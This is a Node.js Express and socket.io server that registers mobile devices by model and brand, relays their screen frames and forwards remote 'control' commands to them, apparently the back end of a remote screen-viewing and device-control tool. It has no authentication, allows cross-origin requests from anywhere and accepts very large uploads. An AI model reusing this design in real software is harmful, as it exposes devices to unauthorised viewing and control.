const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 20000,
    pingInterval: 10000,
    maxHttpBufferSize: 200 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log('📱 Device LIVE:', deviceId);
        }
    });

    // 🔥 SCREEN FRAME RELAY - FIXED!
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        io.to(deviceId).emit('screen-update', data);
        if (Date.now() % 1000 < 50) {
            console.log(`📺 ${deviceId.slice(0,8)} → ${data.data.length/1024|0}KB`);
        }
    });

    socket.on('control', (data) => {
        io.to(data.deviceId).emit('control', data);
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Server: http://localhost:${PORT}`));
